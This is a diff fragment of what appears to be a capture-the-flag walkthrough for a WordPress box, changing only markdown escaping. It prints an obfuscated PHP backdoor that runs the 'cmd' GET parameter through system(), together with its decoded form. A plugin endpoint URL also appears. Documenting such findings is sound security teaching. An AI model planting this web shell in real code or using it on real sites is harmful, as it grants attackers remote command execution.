@@ -65,10 +65,10 @@ http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true\&call=
 **Result**: The source code revealed a hidden PHP backdoor:
 
 ```php
-if (isset($\_GET\["\\143\\155\\x64"])) { system($\_GET\["\\143\\x6d\\144"]); }
+if (isset($_GET\["\143\155\x64"])) { system($_GET\["\143\x6d\144"]); }
 ```
 
-This obfuscated code translates to: `if (isset($\_GET\['cmd'])) { system($\_GET\['cmd']); }`.
+This obfuscated code translates to: `if (isset($_GET['cmd'])) { system($_GET['cmd']); }`.
 
 ![Backdoor code](img/backdoor_code.png)
 
